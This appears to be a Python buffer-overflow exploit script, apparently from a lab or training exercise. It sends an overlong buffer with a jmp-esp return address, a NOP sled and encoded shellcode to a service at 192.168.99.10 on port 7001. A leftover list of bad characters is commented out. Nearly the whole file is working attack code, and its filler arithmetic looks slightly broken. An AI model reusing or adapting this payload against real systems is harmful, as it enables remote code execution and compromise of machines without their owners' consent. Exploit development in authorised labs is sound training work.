#!/usr/bin/python
import socket

try:
  print("\nSending evil buffer...")

  offset = b"A" * 2288
  eip = b"\xcf\x10\x80\x14" # jmp esp 148010cf
  offset2 = b"C" * 4
  nops = b"\x90" * 10
  esp = bytearray(
"\xbb\x88\x79\x28\xb4\xda\xda\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x58\x12\x83\xc0\x04\x03\xd0\x77\xca\x41\x1c\x6f\x88"
"\xaa\xdc\x70\xed\x23\x39\x41\x2d\x57\x4a\xf2\x9d\x13\x1e\xff"
"\x56\x71\x8a\x74\x1a\x5e\xbd\x3d\x91\xb8\xf0\xbe\x8a\xf9\x93"
"\x3c\xd1\x2d\x73\x7c\x1a\x20\x72\xb9\x47\xc9\x26\x12\x03\x7c"
"\xd6\x17\x59\xbd\x5d\x6b\x4f\xc5\x82\x3c\x6e\xe4\x15\x36\x29"
"\x26\x94\x9b\x41\x6f\x8e\xf8\x6c\x39\x25\xca\x1b\xb8\xef\x02"
"\xe3\x17\xce\xaa\x16\x69\x17\x0c\xc9\x1c\x61\x6e\x74\x27\xb6"
"\x0c\xa2\xa2\x2c\xb6\x21\x14\x88\x46\xe5\xc3\x5b\x44\x42\x87"
"\x03\x49\x55\x44\x38\x75\xde\x6b\xee\xff\xa4\x4f\x2a\x5b\x7e"
"\xf1\x6b\x01\xd1\x0e\x6b\xea\x8e\xaa\xe0\x07\xda\xc6\xab\x4f"
"\x2f\xeb\x53\x90\x27\x7c\x20\xa2\xe8\xd6\xae\x8e\x61\xf1\x29"
"\xf0\x5b\x45\xa5\x0f\x64\xb6\xec\xcb\x30\xe6\x86\xfa\x38\x6d"
"\x56\x02\xed\x22\x06\xac\x5e\x83\xf6\x0c\x0f\x6b\x1c\x83\x70"
"\x8b\x1f\x49\x19\x26\xda\x1a\xe6\x1f\xd5\xb9\x8e\x5d\x15\x3f"
"\xf4\xeb\xf3\x55\x1a\xba\xac\xc1\x83\xe7\x26\x73\x4b\x32\x43"
"\xb3\xc7\xb1\xb4\x7a\x20\xbf\xa6\xeb\xc0\x8a\x94\xba\xdf\x20"
"\xb0\x21\x4d\xaf\x40\x2f\x6e\x78\x17\x78\x40\x71\xfd\x94\xfb"
"\x2b\xe3\x64\x9d\x14\xa7\xb2\x5e\x9a\x26\x36\xda\xb8\x38\x8e"
"\xe3\x84\x6c\x5e\xb2\x52\xda\x18\x6c\x15\xb4\xf2\xc3\xff\x50"
"\x82\x2f\xc0\x26\x8b\x65\xb6\xc6\x3a\xd0\x8f\xf9\xf3\xb4\x07"
"\x82\xe9\x24\xe7\x59\xaa\x55\xa2\xc3\x9b\xfd\x6b\x96\x99\x63"
"\x8c\x4d\xdd\x9d\x0f\x67\x9e\x59\x0f\x02\x9b\x26\x97\xff\xd1"
"\x37\x72\xff\x46\x37\x57"
 )
#   badchars = (
#  b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
#  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
#  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
#  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
#  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
#  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
#  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
#  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
#  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
#  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
#  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
#  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
#  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
#  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
#  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
#  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#   )
  filler = b"D" * (2096 - len(offset) - len(offset2) -len(nops) - len(eip) - len(esp))
  buffer = offset + eip + offset2 + nops + esp + filler
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.99.10", 7001))
  s.send(buffer)
  s.close()

  print("\nDone!")
  
except:
  print("\nCould not connect!")